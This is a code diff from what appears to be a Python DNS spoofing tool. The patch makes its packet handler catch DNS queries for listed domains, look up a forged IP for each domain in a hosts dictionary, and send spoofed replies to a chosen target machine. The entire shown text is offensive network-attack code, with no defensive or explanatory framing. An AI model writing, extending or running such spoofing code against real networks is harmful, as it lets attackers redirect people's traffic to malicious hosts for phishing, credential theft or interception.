@@ -28,12 +28,14 @@ def forge_packet(packet_to_forge, ip):
     return forged_packet
 
 
-def packet_handler(packet_to_process, target, ip):
+def packet_handler(packet_to_process, target):
     if packet_to_process.haslayer(DNS) and packet_to_process[DNS].qr == 0:
         # print(packet_to_process[DNS].qd.qname.decode('UTF-8'))
         # print(packet_to_process[IP].src)
-        if packet_to_process[DNS].qd.qname.decode('UTF-8') in domains:
+        current_domain = packet_to_process[DNS].qd.qname.decode('UTF-8')
+        if current_domain in domains:
             print(packet_to_process)
+            ip = hosts_dict[current_domain]
             if target is None or packet_to_process[IP].src == target:
                 forged_packet = forge_packet(packet_to_process, ip)
                 send(forged_packet, verbose=0)
